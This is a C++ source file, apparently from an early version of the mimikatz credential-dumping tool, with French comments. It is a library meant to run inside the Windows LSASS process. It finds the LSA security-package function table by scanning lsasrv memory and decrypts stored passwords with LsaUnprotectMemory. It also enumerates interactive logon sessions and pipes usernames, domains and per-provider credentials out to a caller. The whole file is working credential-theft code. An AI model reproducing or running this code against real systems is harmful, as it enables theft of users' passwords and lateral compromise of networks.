/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "sekurlsa.h"
PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable = NULL;

__kextdll bool __cdecl getDescription(wstring * maDescription)
{
	maDescription->assign(L"SekurLSA : librairie de manipulation des données de sécurités dans LSASS\n");
	return mod_system::getVersion(&mod_system::GLOB_Version);
}

bool searchLSAFuncs()
{
	if(!SeckPkgFunctionTable)
	{
		if(HMODULE hLsasrv = GetModuleHandle(L"lsasrv"))
		{
			struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable = {GetProcAddress(hLsasrv, "LsaIRegisterNotification"), GetProcAddress(hLsasrv, "LsaICancelNotification")};
			if(extractPkgFunctionTable.LsaIRegisterNotification && extractPkgFunctionTable.LsaICancelNotification)
				mod_memory::genericPatternSearch(reinterpret_cast<PBYTE *>(&SeckPkgFunctionTable), L"lsasrv", reinterpret_cast<PBYTE>(&extractPkgFunctionTable), sizeof(extractPkgFunctionTable), - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification), NULL, true, true);
		}
	}
	return (SeckPkgFunctionTable != NULL);
}

wstring getPasswordFromProtectedUnicodeString(LSA_UNICODE_STRING * ptrPass)
{
	wstring password;
	if(ptrPass->Buffer && (ptrPass->Length > 0))
	{
		BYTE * monPass = new BYTE[ptrPass->MaximumLength];
		RtlCopyMemory(monPass, ptrPass->Buffer, ptrPass->MaximumLength);
		SeckPkgFunctionTable->LsaUnprotectMemory(monPass, ptrPass->MaximumLength);
		password.assign(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monPass), ptrPass->Length));
		delete[] monPass;
	}
	return password;
}

bool getLogonData(mod_pipe * monPipe, vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
{
	bool sendOk = true;
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count, &sessions)))
	{
		for (ULONG i = 0; i < count && sendOk; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if(NT_SUCCESS(LsaGetLogonSessionData(&sessions[i], &sessionData)))
			{
				if(sessionData->LogonType != Network)
				{
					wostringstream maPremiereReponse;
					maPremiereReponse << endl <<
						L"Authentification Id         : "	<< sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
						L"Package d\'authentification  : "	<< mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
						L"Utilisateur principal       : "	<< mod_text::stringOfSTRING(sessionData->UserName) << endl <<
						L"Domaine d\'authentification  : "	<< mod_text::stringOfSTRING(sessionData->LogonDomain) << endl;

					sendOk = sendTo(monPipe, maPremiereReponse.str());

					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
					{
						wostringstream maSecondeReponse;
						maSecondeReponse << L'\t' << monProvider->second << L" : \t";
						sendOk = sendTo(monPipe, maSecondeReponse.str());
						monProvider->first(&sessions[i], monPipe, mesArguments->empty());
						sendOk = sendTo(monPipe, L"\n");
					}
				}
				LsaFreeReturnBuffer(sessionData);
			}
			else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'obtenir les données de session\n");
		}
		LsaFreeReturnBuffer(sessions);
	}
	else sendOk = sendTo(monPipe, L"Erreur : Impossible d\'énumerer les sessions courantes\n");

	return sendOk;
}
